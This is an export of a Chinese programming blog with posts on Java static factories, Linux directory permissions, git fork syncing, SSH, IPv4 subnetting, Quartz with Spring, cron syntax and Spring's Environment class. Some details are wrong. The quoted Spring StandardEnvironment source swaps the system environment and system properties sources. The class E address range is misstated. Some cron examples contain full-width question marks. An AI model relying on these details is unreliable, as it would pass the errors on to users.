明显链式调用方法比较优雅 Student s2 = Student.create().name("stu2").age(12); &#125;&#125; 优势和缺陷显而易见, 使用链式调用的代码更加简洁优雅, 方法间的关联度紧密。同样缺陷也在这里, 每个方法都依赖上一个方法, 如果有一个返回空指针, 那么就会报错。需要代码编写人员的功底比较强。当然, return this;是不可能空指针异常的。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用静态构造器取代new]]></title>
    <url>%2Fposts%2Fuse_static_method_to_replace_new_object.html</url>
    <content type="text"><![CDATA[前言一般创建对象都是new出来的, Spring提供的是xml反射(或者使用注解)创建, 将创建对象的任务交给Spring完成。不懂Spring可以将其理解为一个存储对象的容器。控制反转并不是什么高大上的东西, 我们也可以做一个小的控制反转的例子。 使用静态构造器取代new比如有个学生类, 将构造函数私有化, 同时创建一个静态的create方法。1234567public class Student&#123; private Student()&#123; &#125; public static Student create()&#123; return new Student(); &#125;&#125; 这样做有什么好处呢?很明显, 我们能给构造函数命名了。维护者不再需要去猜测new Student(true)是什么意思。 还体现了职责分离, 创建对象的具体过程交给了对象类自己完成, 外部调用者不需要关心创建对象的流程。这里为了体现差异, 将方法名写为中文, 实际开发不推荐写中文。123456789101112public class Student&#123; boolean 优秀; private Student(boolean status)&#123; this.优秀 = status; &#125; public static Student 获得一个优秀学生()&#123; return new Student(true); &#125; public static Student 获得一个不好学生()&#123; return new Student(false); &#125;&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux为什么拥有w权限却不能删除文件]]></title>
    <url>%2Fposts%2FWhy_have_write_permission_but_can_not_delete_the_file.html</url>
    <content type="text"><![CDATA[前言Linux中万物皆文件, 目录是文件, 硬件是文件.这里的文件和Windows的概念可完全不一样.经常遇到的是, 对文件拥有w写权限, 可是却提示没有删除权限. 初始化情景123456[ahao@localhost ~]$ su - # 切换为root用户[ahao@localhost ~]$ mkdir testDir # 创建testDir目录[ahao@localhost ~]$ echo 123 &gt; testDir/file # 创建testDir目录下的file文件[ahao@localhost ~]$ chmod 555 testDir/ # 取消testDir目录的w写权限[ahao@localhost tmp]$ rm testDir/file # 删除testDir目录下的file文件, 失败rm: 无法删除"testDir/file": 权限不够 分析先查看文件和文件夹的权限信息12dr-xr-xr-x. 2 ahao ahao 18 10月 31 23:30 testDir-rw-rw-r--. 1 ahao ahao 4 10月 31 23:30 file testDir目录文件和file文件的拥有者和用户组毫无疑问是ahao.那么对应的权限应该是r-x和rw-, 也就是第2-4位. 那么用户ahao对file文件是有w写权限的, 为什么不能删除呢?原因在于删除file文件, 是对testDir目录文件进行w写操作, 而不是对file文件进行w写操作.对于Windows用户来说, 这是有点绕, 很难理解的.Linux的w写权限的意思是, 允许对其子数据进行写入.file文件的w写权限是允许修改123字符串.testDir目录文件的w写权限是允许修改file文件. 从文件和文件夹的权限信息可以看出,用户ahao是没有testDir目录文件的w写权限的, 换句话说, 就是不能修改file文件, 自然也就不能删除了。12dr-xr-xr-x. 2 ahao ahao 18 10月 31 23:30 testDir-rw-rw-r--. 1 ahao ahao 4 10月 31 23:30 file]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用git同步一个fork]]></title>
    <url>%2Fposts%2Fhow_to_update_fork_by_git.html</url>
    <content type="text"><![CDATA[前言搭了个Hexo博客, 然后把NexT主题fork了一下。本文记录下从被fork的项目更新fork的操作。 添加一个远程仓库123456$ git remote add upstream 原始项目地址 # 添加一个名为upstream的远程项目$ git remote -v # 查看远程仓库, origin是默认仓库名, 一般是自己的github项目 origin https://github.com/YOUR_USERNAME/YOUR_FORK.git (fetch) origin https://github.com/YOUR_USERNAME/YOUR_FORK.git (push) upstream https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY.git (fetch) upstream https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY.git (push) 从原始项目同步123$ git fetch upstream # 下载原始项目upstream的所有变动$ git checkout master # 确保切换到本地master分支$ git merge upstream/master # 合并upstream仓库的master分支到当前分支 解决冲突一般可以自动解决冲突问题。但是复杂的冲突就需要手动解决。 直接编辑文件手动打开冲突的文件, 冲突的部分是bbbbbbb和ccccccc, 也就是特殊符号之间的字符串。1234567aaaaaaa&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADbbbbbbb=======ccccccc&gt;&gt;&gt;&gt;&gt;&gt;&gt; dddddddeeeeeee 图形界面1$ git mergetool # 用预先配置的Beyond Compare解决冲突 参考资料 同步一个 fork Git下的冲突解决]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux之SSH协议]]></title>
    <url>%2Fposts%2FLinux_SSH_protocol.html</url>
    <content type="text"><![CDATA[前言SSH 为 Secure Shell 的缩写。在使用远程工具连接 Linux 时使用的就是 SSH协议。SSH协议 使用的是非对称加密算法。简单的说, 有一个管道, 用来传递数据, A和B在管道的两端, A和B各自拥有一把锁和一把钥匙。B要传数据给A, 那么B先把自己的锁给A。A用自己的A锁加上B锁给数据上锁, 这时候只有A的A钥匙和B的B钥匙能解开这个锁获取数据。A和B使用不同的锁和钥匙, 这就是非对称加密。 Linux下的SSH这里使用 127.0.0.1 回环地址进行测试。除了远程操作之外, 还可以使用 SSH 进行文件的上传和下载。123456789101112[ahao@localhost ~]$ ssh username@IP # 远程管理指定Linux服务器[ahao@localhost ~]$ ssh root@127.0.0.1 # 连接本机的root用户The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.ECDSA key fingerprint is 60:18:c3:85:f3:2e:f9:34:4d:2f:9a:0e:cf:e9:85:64.Are you sure you want to continue connecting (yes/no)? yes # 选择yes进行连接Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.root@127.0.0.1's password: # 输入密码Last login: Tue Oct 10 00:06:25 2017[root@localhost ~]# exit # 退出[ahao@localhost ~]$ scp [-r] 用户名@IP:文件路径 本地路径 # 下载文件[ahao@localhost ~]$ scp [-r] 本地文件 用户名@IP:上传路径 # 上传文件 Windows下的SSH借助SSH工具xshell使用 ifconfig 查看Linux的IP地址, 照着软件配置就好了, 百度很多使用教程。 小知识Linux的SSH公钥存储在 ~/.ssh/known_hosts。Windows的SSH公钥存储在 %HOMEPATH%/.ssh/known_hosts。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络之IP地址、子网掩码、网关详解]]></title>
    <url>%2Fposts%2FIP_address%2C_subnet_mask%2C_gateway_Introduction.html</url>
    <content type="text"><![CDATA[IP地址由于IPv6尚未普及，这里的 IP地址为IPv4地址。IP地址相当于互联网上的门牌号, 由 4字节, 也就是 32位 的二进制码组成，包含了网络号( net-id )和主机号( host-id )。 网络号( net-id ): 标志主机(或路由器)所连接到的网络。 主机号( host-id ): 网络号范围内唯一的主机(或路由器)。 IP地址种类 二进制组成(前缀位+网络位+主机位) IP范围 网络数 主机数/网络 A类地址 0+7位网络号+24位主机号 1.0.0.0 - 127.255.255.255 2^7-2 2^24-2 B类地址 10+14位网络号+16位主机号 128.0.0.0 - 191.255.255.255 2^14-1 2^16-2 C类地址 110+21位网络号+8位主机号 192.0.0.0 - 223.255.255.255 2^21-1 2^8-2 D类地址 1110+多播地址(用于多播) 224.0.0.0 - 239.255.255.255 - - E类地址 1111+保留位(不开放, 保留使用) 240.0.0.0-249.255.255.255 - - 前缀位标识是什么种类的网络, 0为A类地址, 10为B类地址, 110为C类地址, 依次类推。 网络数计算网络数就是一种网络的子网数, 比如A类地址, 可以分为多少个子网。看表格可以推出网络数的计算公式为: 2^网络号位数。规定网络地址全为 0 的IP地址是保留地址，意思是“本网络”。 在A类地址中，实际上 0.0.0.0 是不指派的，而可以指派的最小网络是 1.0.0.0；网络地址为 127 的A类IP地址(比如常用的 127.0.0.1)保留作为本地软件环回测试本主机的进程之间的通信。所以A类地址网络数为 2^7-2。 在B类地址中，实际上 128.0.0.0 是不指派的，而可以指派的最小网络是 128.1.0.0，所以B类地址网络数是 2^14-1。 在C类地址中，实际上 192.0.0.0 是不指派的，而可以指派的最小网络是 192.0.1.0，所以C类地址网络数是 2^21-1。 主机数计算主机数就是一个子网里面可以容纳多少台主机。看表格可以推出主机数的计算公式为: 2^主机号位数-2。主机号全为0表示该网络，而主机号全为1表示广播地址, 排除掉这两个。比如A类地址 1.0.0.0 表示主机所在的网段的网络地址, 1.255.255.255 为该网段的广播地址。 私有IP地址经常可以看到 192.168.1.101 这类的IP地址, 这些是私有IP地址, 专用地址, 也就是局域网分配的地址。公网IP地址是需要掏钱申请的，私有IP地址不用掏钱, 但是仅限内网使用, 目的是为了节约公网IP。 IP地址种类 私有IP范围 A类地址 10.0.0.0 - 10.255.255.255 B类地址 172.16.0.0 - 172.31.255.255 C类地址 192.168.0.0 - 192.168.255.255 路由器看到专用地址就不转发，所以说专用地址作为目的地址是不可能在因特网上传送的。专用IP地址也可叫做可重用地址。那好，问题来了，如果配置了这些专用地址的主机想和因特网上的主机通信，怎么办呢？NAT(network address translation: 网络地址转换)在这种情况下就应运而生了。NAT就是将这种地址转换成有效的外部全球IP地址，使得整个专用网只需要一个全球IP地址就可以与因特网联通。 使用NAT技术，需要在专用网(整个网络内部都是使用的这种地址)连接到因特网的路由器上安装NAT软件。装有NAT软件的路由器叫做NAT路由器，它至少有一个有效的外部全球IP地址。但是NAT并不能从根本上解决IP地址的耗尽问题，因为NAT并不能从根本上解决IP地址的耗尽问题，因为NAT并没有增加IP地址的个数。而真正解决IP地址耗尽问题的是IPv6。 子网掩码计算网络地址就是判断网络中的计算机在不在同一网段,在就能通,不在就不能通。将IP地址和子网掩码都换算成二进制,然后进行与运算,结果就是网络地址, 也就是网络号。子网掩码的1和0必须连续, 比如 11111111.00000000.00000000.00000000, 即 255.0.0.0。 以上的主机数和网络数都是使用标准子网掩码算出来的, 比如A类地址的标准子网掩码为 255.0.0.0, B类地址的标准子网掩码为 255.255.0.0, C类地址的标准子网掩码为 255.255.255.0。 比如 126.1.2.3 和 255.0.0.0进行二进制的按位与运算, 得到网络地址 126.0.0.0。这个 126.0.0.0也就是上面计算主机数排除掉的该网段内其中一位IP地址。 当然还有非标准的子网掩码。具体参考 常用计算例子 章节的第1题。 网关网关是用来进行跨网段通信的工具, 本质是一个IP地址。 比如一个C类网 A192.168.1.101 想要和 B192.168.0.101 通信, 标准的子网掩码是 255.255.255.0, 进行按位与运算获得的网络地址为 192.168.1.0 和 192.168.0.0, 也就是不在同一个网段内, 那么只通过交换机是不能进行通信的, 必须借助路由器。 可以把网关想象一个国家的外交部。A想要和B通信, 但是A在中国, B在美国, 那么就不能直接面对面谈话(借助交换机), 这时候, A可以把信息传递给中国的外交部X, 由X交给美国的外交部Y, 再由Y交给B。 也就是说, 如果内网IP地址想要访问不是同一网段的主机, 那么必须借助网关. 将数据发送到另一个网关。 常用计算例子1、利用子网数目计算子网掩码把B类地址 172.16.0.0 划分成 30 个子网络，它的子网掩码是多少？①将子网络数目 30 转换成二进制表示 11110②统计一下这个二进制的数共有 5 位③注意：当二进制数中只有一个1的时候，所统计的位数需要减1（例如：10000要统计为4位）④将B类地址的子网掩码 255.255.0.0 主机地址部分的前 5 位变成 1⑤这就得到了所要的子网掩码（11111111.11111111.11111000.00000000 ）255.255.248.0。 2、利用主机数目计算子网掩码把B类地址 172.16.0.0 划分成若干子网络，每个子网络能容纳 500 台主机，它的子网掩码是多少？①把 500 转换成二进制表示 111110100②统计一下这个二进制的数共有 9 位③将子网掩码 255.255.255.255 从后向前的 9 位变成 0④这就得到了所要的子网掩码（11111111.11111111.11111110.00000000）255.255.254.0。 3、利用子网掩码计算最大有效子网数A类IP地址，子网掩码为 255.224.0.0 ，它所能划分的最大有效子网数是多少？①将子网掩码转换成二进制表示 11111111.11100000.00000000.00000000②统计一下它的网络位共有 11 位③A类地址网络位的基础数是 8 ，二者之间的位数差是 3④最大有效子网数就是2^3，即最多可以划分 8 个子网络。 4、利用子网掩码计算最大可用主机数A类IP地址，子网掩码为 255.252.0.0 ，将它划分成若干子网络，每个子网络中可用主机数有多少？①将子网掩码转换成二进制表示 11111111.11111100.00000000.00000000②统计一下它的主机位共有 18 位③最大可用主机数就是 2^18-2（除去全是0的网络地址和全是1广播地址），即每个子网络最多有 262142 台主机可用。 5、利用子网掩码确定子网络的起止地址B类IP地址 172.16.0.0 ，子网掩码为 255.255.192.0 ，它所能划分的子网络起止地址是多少？①利用子网掩码计算，最多可以划分 4 个子网络②利用子网掩码计算，每个子网络可容纳 16384 台主机（包括网络地址和广播地址）③用 16384 除以 256 （网段内包括网络地址和广播地址的全部主机数），结果是 64④具体划分网络起止方法如下：172.16.0.0～172.16.63.255172.16.64.0～172.16.127.255172.16.128.0～172.16.191.255172.16.192.0～172.16.255.255 参考资料 TCP/IP之IP地址详解 子网数、主机数与子网掩码的关系 IP地址，子网掩码，默认网关，DNS服务器详解]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Quartz之整合Spring]]></title>
    <url>%2Fposts%2FQuartz_and_Spring_combination.html</url>
    <content type="text"><![CDATA[前言作为Web开发者, Spring是必不可少的一个框架, 自然需要把Quartz整合进去。所幸网上已有很多教程, 我这里也只是简单的整合一下, 用于以后项目的CV大法。Quartz 有调度器Scheduler、触发器 Trigger、任务 JobDetail三个组件。一个任务可以给多个调度器执行，触发器在指定时间运行任务，调度器操作触发器执行定时任务。 maven配置这里的 Spring 版本是 4.3.9.RELEASE , Quartz 版本是 2.3.0。 spring-tx: 定时任务依赖于事务, 引入spring-jdbc即可, 自带spring-tx spring-context-support: 提供对Quartz定时任务的支持 quartz: 定时任务框架 创建任务JobDetail的两种方法 使用 MethodInvokingJobDetailFactoryBean 通过反射调用 Bean的方法。 使用 JobDetailFactoryBean, 必须搭配 QuartzJobBean。 推荐用第一种方法, 低侵入式, 降低耦合性。1234567891011121314151617181920// 第一种创建任务的方法, 不依赖框架的Java Bean形式public class MyBean1 &#123; public void hello(String msg)&#123; System.out.println(this.getClass().getSimpleName()+" : "+ DateFormatUtils.format(System.currentTimeMillis(),"yyyy-MM-dd HH:mm:ss")+" : "+msg); &#125;&#125;// 第二种创建任务的方法, 依赖spring-context-support// org.springframework.scheduling.quartz.QuartzJobBean public class MyBean2 extends QuartzJobBean &#123; private String key; @Override protected void executeInternal(JobExecutionContext jobExecutionContext) throws JobExecutionException &#123; System.out.println(this.getClass().getSimpleName()+" : "+ DateFormatUtils.format(System.currentTimeMillis(), "yyyy-MM-dd HH:mm:ss")); &#125; public void setKey(String key) &#123; this.key = key; &#125;&#125; 12345678910111213141516171819202122232425262728&lt;beans &gt; &lt;bean id="myBean1" class="com.ahao.MyBean1"/&gt; &lt;!-- 反射调用Bean的某个方法, 传入arguments参数 --&gt; &lt;bean id="myBeanJob1" class="org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean"&gt; &lt;property name="targetObject" ref="myBean1"/&gt; &lt;property name="targetMethod" value="hello"/&gt; &lt;property name="arguments"&gt; &lt;list&gt; &lt;value&gt;hello World!&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- 依赖QuartzJobBean --&gt; &lt;bean id="myBeanJob2" class="org.springframework.scheduling.quartz.JobDetailFactoryBean"&gt; &lt;!-- MyBean2必须继承QuartzJobBean --&gt; &lt;property name="jobClass" value="com.ahao.MyBean2"/&gt; &lt;!-- 参数通过setter方法注入 --&gt; &lt;property name="jobDataAsMap"&gt; &lt;map&gt; &lt;entry key="key" value="value"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;!-- 未绑定Trigger时不会抛出异常 --&gt; &lt;property name="durability" value="true"/&gt; &lt;/bean&gt;&lt;/beans&gt; 创建触发器Trigger的两种方法关于cron表达式，请参照另一篇文章Quartz之cron表达式详解123456789101112131415&lt;beans &gt; &lt;bean id="trigger1" class="org.springframework.scheduling.quartz.SimpleTriggerFactoryBean"&gt; &lt;property name="jobDetail" ref="myBeanJob1"/&gt; &lt;!-- 延迟1秒启动 --&gt; &lt;property name="startDelay" value="1000"/&gt; &lt;!-- 每2秒触发一次 --&gt; &lt;property name="repeatInterval" value="2000"/&gt; &lt;/bean&gt; &lt;bean id="trigger2" class="org.springframework.scheduling.quartz.CronTriggerFactoryBean"&gt; &lt;property name="jobDetail" ref="myBeanJob2"/&gt; &lt;!-- cron表达式 --&gt; &lt;property name="cronExpression" value="0/5 * * * * ?"/&gt; &lt;/bean&gt;&lt;/beans&gt; 创建调度器12345678910&lt;beans&gt; &lt;bean class="org.springframework.scheduling.quartz.SchedulerFactoryBean"&gt; &lt;property name="triggers"&gt; &lt;list&gt; &lt;ref bean="trigger1"/&gt; &lt;ref bean="trigger2"/&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 运行启动Tomcat服务器, 看到控制台有输出即可。完整的 spring-quartz.xml如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd"&gt; &lt;bean id="myBean1" class="com.ahao.MyBean1"/&gt; &lt;!-- 反射调用Bean的某个方法, 传入arguments参数 --&gt; &lt;bean id="myBeanJob1" class="org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean"&gt; &lt;property name="targetObject" ref="myBean1"/&gt; &lt;property name="targetMethod" value="hello"/&gt; &lt;property name="arguments"&gt; &lt;list&gt; &lt;value&gt;hello World!&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- 依赖QuartzJobBean --&gt; &lt;bean id="myBeanJob2" class="org.springframework.scheduling.quartz.JobDetailFactoryBean"&gt; &lt;!-- MyBean2必须继承QuartzJobBean --&gt; &lt;property name="jobClass" value="com.ahao.MyBean2"/&gt; &lt;!-- 参数通过setter方法注入 --&gt; &lt;property name="jobDataAsMap"&gt; &lt;map&gt; &lt;entry key="key" value="value"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;!-- 未绑定Trigger时不会抛出异常 --&gt; &lt;property name="durability" value="true"/&gt; &lt;/bean&gt; &lt;bean id="trigger1" class="org.springframework.scheduling.quartz.SimpleTriggerFactoryBean"&gt; &lt;property name="jobDetail" ref="myBeanJob1"/&gt; &lt;!-- 延迟1秒启动 --&gt; &lt;property name="startDelay" value="1000"/&gt; &lt;!-- 每2秒触发一次 --&gt; &lt;property name="repeatInterval" value="2000"/&gt; &lt;/bean&gt; &lt;bean id="trigger2" class="org.springframework.scheduling.quartz.CronTriggerFactoryBean"&gt; &lt;property name="jobDetail" ref="myBeanJob2"/&gt; &lt;!-- cron表达式 --&gt; &lt;property name="cronExpression" value="0/5 * * * * ?"/&gt; &lt;/bean&gt; &lt;bean class="org.springframework.scheduling.quartz.SchedulerFactoryBean"&gt; &lt;property name="triggers"&gt; &lt;list&gt; &lt;ref bean="trigger1"/&gt; &lt;ref bean="trigger2"/&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring</tag>
        <tag>Quartz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Quartz之cron表达式详解]]></title>
    <url>%2Fposts%2Fcron_expression_of_Quartz.html</url>
    <content type="text"><![CDATA[前言cron expression使用过 Quartz 定时调度框架的都知道常用的有两种触发器。 SimpleTrigger 和 CronTrigger, 本章的主角 CronTrigger 通过 cron表达式 来设置什么时候触发任务。 表达式格式crontab 命令常见于 Unix 和 类Unix 的操作系统之中，用于设置周期性被执行的指令。 CronTrigger 使用的就是 cron表达式。格式：[秒] [分] [时] [日] [月] [周] [年]共7个子表达式, 用空格隔开。 字段 是否必填 允许值 允许的特殊字符 秒 是 0~59 ,-*/ 分 是 0~59 ,-*/ 时 是 0~23 ,-*/ 日 是 1~31 ,-*?/LWC 月 是 1~12或者JAN-DEC ,-*/ 周 是 1~7或者SUN-SAT ,-*?/LC# 年 否 empty,1970~2099 ,-*/ 特殊字符 “?”字符：表示不确定的值 “,”字符：指定数个值 “-“字符：指定一个值的范围 “/“字符：指定一个值的增加幅度。n/m表示从n开始，每次增加m “L”字符：用在日表示一个月中的最后一天，用在周表示该月最后一个星期X “W”字符：指定离给定日期最近的工作日(周一到周五) “#”字符：表示该月第几个周X。6#3表示该月第3个周五 实例 每天10点15分: 0 15 10 ? * * 每天下午的2点到2点59分(整点开始, 每隔5分触发): 0 0/5 14 * * ? 周一到周五每天上午的10点15分: 0 15 10 ？ * MON-FRI 每月的第三周的星期五: 0 15 10 ? * 6#3 2016年到2017年每月最后一周的星期五的10点15分: 0 15 10 ？ * 6L 2016-2017]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring</tag>
        <tag>Quartz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Environment详解]]></title>
    <url>%2Fposts%2FEnvironment_of_Spring_MVC.html</url>
    <content type="text"><![CDATA[前言HttpServletBean 实现了 EnvironmentCapable 和 EnvironmentAware 接口。Environment可以对一些应用变量进行初始化, 存储到内存中。方便 Bean 进行获取。 Environment 初始化查看 DispatcherServlet 的父类 HttpServletBean 的源码, 可以看到 HttpServletBean 的属性 ConfigurableEnvironment 接口的实现类是 StandardServletEnvironment。123456789101112131415161718192021// org.springframework.web.servlet.HttpServletBeanpublic abstract class HttpServletBean extends HttpServlet implements EnvironmentCapable, EnvironmentAware &#123; private ConfigurableEnvironment environment; // 省略部分代码 @Override public void setEnvironment(Environment environment) &#123; this.environment = (ConfigurableEnvironment) environment; &#125; @Override public ConfigurableEnvironment getEnvironment() &#123; if (this.environment == null) &#123; this.environment = createEnvironment(); &#125; return this.environment; &#125; protected ConfigurableEnvironment createEnvironment() &#123; // 默认实现类是 StandardServletEnvironment return new StandardServletEnvironment(); &#125;&#125; 继承树 先明确一个概念, Environment 是用来装载 属性 的。 StandardServletEnvironment 的父类 AbstractEnvironment 里面的 MutablePropertySources 属性（可以看成 LinkedHashMap&lt;String, String&gt;）封装了 5 个属性(稍后说明为什么) ServletContext ( 封装 context-param ) ServletConfig ( 封装 init-param ) JndiProperty 系统环境变量 JVM 系统属性变量 那么观察下子类 StandardServletEnvironment 的源码，以及父类StandardEnvironment 的源码, 发现主要的方法就是 customizePropertySources() , 也就是对 MutablePropertySources 属性进行操作1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// org.springframework.web.context.support.StandardServletEnvironmentpublic class StandardServletEnvironment extends StandardEnvironment implements ConfigurableWebEnvironment &#123; // 省略部分代码 @Override protected void customizePropertySources(MutablePropertySources propertySources) &#123; // propertySources 可以看成 LinkedHashMap // 装载 ServletConfig 的占位符, 延迟载入 propertySources.addLast(new StubPropertySource("servletConfigInitParams")); // 装载 ServletContext 的占位符, 延迟载入 propertySources.addLast(new StubPropertySource("servletContextInitParams")); // 装载 JndiProperties if (JndiLocatorDelegate.isDefaultJndiEnvironmentAvailable()) &#123; propertySources.addLast(new JndiPropertySource("jndiProperties")); &#125; // 父类StandardEnvironment 负责装载 系统环境变量 和 JVM 系统属性变量 super.customizePropertySources(propertySources); &#125; @Override public void initPropertySources(ServletContext servletContext, ServletConfig servletConfig) &#123; // FrameworkServlet 在刷新时调用, 延迟载入 // 将ServletContext和ServletConfig注入PropertySources中 WebApplicationContextUtils.initServletPropertySources(getPropertySources(), servletContext, servletConfig); &#125;&#125;// org.springframework.core.env.StandardEnvironmentpublic class StandardEnvironment extends AbstractEnvironment &#123; @Override protected void customizePropertySources(MutablePropertySources propertySources) &#123; // 装载 系统环境变量 propertySources.addLast(new MapPropertySource("systemEnvironment", getSystemProperties())); // 装载 JVM 系统属性变量 propertySources.addLast(new SystemEnvironmentPropertySource("systemProperties", getSystemEnvironment())); &#125; @Override public Map&lt;String, Object&gt; getSystemProperties() &#123; try &#123; return (Map) System.getProperties(); &#125; catch (AccessControlException ex) &#123; return (Map) new ReadOnlySystemAttributesMap() &#123; @Override protected String getSystemAttribute(String attributeName) &#123; try &#123; return System.getProperty(attributeName); &#125; catch (AccessControlException ex) &#123; return null; &#125; &#125; &#125;; &#125; &#125; @Override public Map&lt;String, Object&gt; getSystemEnvironment() &#123; if (suppressGetenvAccess()) &#123; return Collections.emptyMap(); &#125; try &#123; return (Map) System.getenv(); &#125; catch (AccessControlException ex) &#123; return (Map) new ReadOnlySystemAttributesMap() &#123; @Override protected String getSystemAttribute(String attributeName) &#123; try &#123; return System.getenv(attributeName); &#125; catch (AccessControlException ex) &#123; return null; &#125; &#125; &#125;; &#125; &#125;&#125; 可以猜测出方法的参数 propertySources 是一个装载 属性 的集合。那么 customizePropertySources 的参数 propertySources 一定不为 null , 也就是 propertySources 被初始化过。初始化一般发生在 构造方法 或者 field 直接 new 中。但是 StandardServletEnvironment 并没有构造方法, 其父类 StandardEnvironment 也没有构造方法。那么只能看最顶层的父类 AbstractEnvironment 。12345678910// org.springframework.core.env.AbstractEnvironmentpublic abstract class AbstractEnvironment implements ConfigurableEnvironment &#123; // 省略部分代码 private final MutablePropertySources propertySources = new MutablePropertySources(this.logger); public AbstractEnvironment() &#123; customizePropertySources(this.propertySources); &#125; protected void customizePropertySources(MutablePropertySources propertySources) &#123; &#125;&#125; 又看到了熟悉的 customizePropertySources() 方法。可以看到 propertySources 是在 field 直接 new 出来的。 propertySources 的实现类是 MutablePropertySources , 里面有一个 CopyOnWriteArrayList 集合，集合中的 PropertySource 是一个 键值对 , 可以看成是 Map.Entry。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// org.springframework.core.env.MutablePropertySourcespublic class MutablePropertySources implements PropertySources &#123; private final List&lt;PropertySource&lt;?&gt;&gt; propertySourceList = new CopyOnWriteArrayList&lt;PropertySource&lt;?&gt;&gt;();&#125;// org.springframework.core.env.PropertySourcespublic interface PropertySources extends Iterable&lt;PropertySource&lt;?&gt;&gt; &#123; boolean contains(String name); PropertySource&lt;?&gt; get(String name);&#125;// org.springframework.core.env.PropertySourcepublic abstract class PropertySource&lt;T&gt; &#123; // 以 键值对 形式存储 protected final String name; protected final T source; // 省略 构造器 和 getter 和 setter 方法 // hashcode 和 equals 只判断 name 属性 public boolean containsProperty(String name) &#123; return (getProperty(name) != null); &#125; // 交给内部类子类 StubPropertySource 和 ComparisonPropertySource 实现 public abstract Object getProperty(String name); // 类似占位符, 在实际的属性不能被及时初始化时保留，并在 Context 刷新时进行替换 public static class StubPropertySource extends PropertySource&lt;Object&gt; &#123; public StubPropertySource(String name) &#123; super(name, new Object()); &#125; @Override public String getProperty(String name) &#123; return null; &#125; &#125; // 类似占位符, 在实际的属性不能被及时初始化时保留，并在 Context 刷新时进行替换 static class ComparisonPropertySource extends StubPropertySource &#123; // 省略部分代码 &#125; public static PropertySource&lt;?&gt; named(String name) &#123; return new ComparisonPropertySource(name); &#125;&#125; 总结说, 就是 AbstractEnvironment 类的 MutablePropertySources 中的 CopyOnWriteArrayList 集合中, 装载了 5 个属性 ServletContext ( StandardServletEnvironment 装载, 封装 context-param ) ServletConfig ( StandardServletEnvironment 装载, 封装 init-param ) JndiProperty ( StandardServletEnvironment 装载 ) 系统环境变量 ( StandardEnvironment 装载 ) JVM 系统属性变量 ( StandardEnvironment 装载 )、 需要注意的是，这里 ServletContext 和 ServletConfig 要等到 FrameworkServlet 刷新的时候调用 StandardServletEnvironment 的 initPropertySources 方法, 来刷新这两个属性。123456789101112131415161718192021// org.springframework.web.context.support.StandardServletEnvironmentpublic class StandardServletEnvironment extends StandardEnvironment implements ConfigurableWebEnvironment &#123; @Override public void initPropertySources(ServletContext servletContext, ServletConfig servletConfig) &#123; // FrameworkServlet 在刷新时调用 // 将ServletContext和ServletConfig注入PropertySources中 WebApplicationContextUtils.initServletPropertySources(getPropertySources(), servletContext, servletConfig); &#125;&#125;// org.springframework.web.context.support.WebApplicationContextUtilspublic abstract class WebApplicationContextUtils &#123; public static void initServletPropertySources( MutablePropertySources propertySources, ServletContext servletContext, ServletConfig servletConfig) &#123; // 省略部分代码 propertySources.replace("servletContextInitParams", new ServletContextPropertySource("servletContextInitParams", servletContext)); propertySources.replace("servletConfigInitParams", new ServletConfigPropertySource("servletConfigInitParams", servletConfig)); &#125;&#125; Environment 的使用Spring 开放了 EnvironmentAware 和 EnvironmentCapable接口。 EnvironmentAware 由 Spring 框架往 Bean 内 注入Environment EnvironmentCapable 通过 getEnvironment 往外面 暴露Environment 开发者只需要实现这两个接口，Spring就会自动注入。12345678&lt;!-- web.xml 省略部分代码 --&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app&gt; &lt;context-param&gt; &lt;param-name&gt;myConfig&lt;/param-name&gt; &lt;param-value&gt;hello&lt;/param-value&gt; &lt;/context-param&gt; &lt;/web-app&gt; 123456789101112131415161718192021public class User implements EnvironmentAware, EnvironmentCapable &#123; private String name; private int age; private Environment environment; public String getHello() &#123; return environment.getProperty("myConfig"); &#125; @Override public void setEnvironment(Environment environment) &#123; // 注入 Environment this.environment = environment; &#125; @Override public Environment getEnvironment() &#123; // 暴露 Environment return environment; &#125;&#125;]]></content>
      <categories>
